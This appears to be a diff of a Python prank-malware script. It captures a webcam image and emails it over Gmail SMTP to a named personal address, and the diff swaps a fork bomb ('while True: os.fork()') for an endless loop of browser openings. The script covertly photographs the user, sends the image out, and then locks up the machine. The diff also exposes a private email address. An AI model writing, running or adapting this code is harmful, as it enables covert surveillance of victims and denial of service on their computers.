@@ -1,7 +1,7 @@
 import cv2
 import smtplib
 from email.message import EmailMessage
-import os
+import webbrowser
 
 cam = cv2.VideoCapture(0)
 
@@ -38,8 +38,6 @@ smtp = smtplib.SMTP_SSL("smtp.gmail.com",  465)
 smtp.login(EMAIL, PASSWORD)
 smtp.sendmail(EMAIL, 'viraj.sharma1501@gmail.com', str(msg))
 
-print('YOUR PC GONNA CRASH')
-
 while True:
- os.fork()
+ webbrowser.open('google.com')
 
